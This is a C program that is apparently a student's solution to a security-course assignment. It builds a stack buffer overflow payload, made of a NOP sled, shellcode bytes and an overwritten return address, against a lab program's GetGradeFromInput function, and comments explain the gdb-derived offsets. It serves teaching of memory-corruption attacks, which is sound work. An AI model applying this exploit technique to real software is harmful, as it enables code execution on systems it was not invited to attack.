#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Shellcode assembly taken from the assignment spec and converted into a C array via the
// provided Python script.
unsigned char shellcode[] = {
0x48, 0x8d, 0x25, 0xf9, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0x0d, 0x00, 0x00, 0x00, 0x48,
0x8d, 0x35, 0x0e, 0x00, 0x00, 0x00, 0x68, 0x30, 0x0c, 0x40, 0x00, 0xc3, 0x41, 0x6c, 0x65,
0x78, 0x20, 0x59, 0x75, 0x00, 0x41, 0x00, 
};

// The return address used by this buffer overflow attack, overwriting the actual return
// address in the GetGradeFromInput function.
unsigned char ret_addr[] = { 0xe0, 0xbf, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00 };

unsigned char nop = 0x90;

int main() {
  /*
  * This comment serves to explain why this code works.
  * 
  * Upon entry to the `GetGradeFromInput` function, 0x2000 is subtracted from %rsp. The resulting
  * address is where the input text to the program is placed after the call to `gets`. 
  *
  * Using gdb, the following observations were made:
  *     - %rsp = 0x7fffffffdde0 at the beginning of GetGradeFromInput
  *     - 0x7fffffffbde0 is the starting address of the input (0xdde0 - 0x2000 = 0xbde0)
  *     - The original return address for `GetGradeFromInput` is located at 0x7fffffffdde8
  *     - The input must be 8200 characters for shellcode & padding in order for the new return
  *         address to overwrite the old one (0xdde8 - 0xbde0 = d8200)
  *     - The new return address should be around 0x7fffffffbde0
  */

  unsigned char buf[8208];

  // First, fill the buffer with NOP's to deal with varying starting stack pointers (NOP sled)
  memset(buf, nop, 8208);

  // Put the shellcode in the middle of the buffer
  memcpy(buf+4000, shellcode, sizeof(shellcode));
  
  // Put the new return address at the end of the buffer (overwites the old one)
  memcpy(buf+8200, ret_addr, 8);

  fwrite(buf, sizeof(unsigned char), 8208, stdout);

  return 0;
}
